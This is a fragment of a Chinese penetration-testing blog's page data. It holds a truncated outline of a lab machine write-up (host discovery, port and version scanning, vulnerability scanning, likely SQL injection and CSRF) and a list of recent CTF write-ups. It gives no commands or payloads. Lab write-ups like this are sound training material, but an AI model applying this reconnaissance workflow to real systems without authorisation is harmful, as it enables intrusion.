探测存活主机，`153`为靶机\n    \n    \n    \n2. 扫描主机所有端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n    一些页面可能存在`sql`注入以及`csrf` ，和一些让人感兴趣的目录\n    \n\nweb渗透\n\n1. `L..."},"recentPosts":[{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"}]},"__N_SSG":true}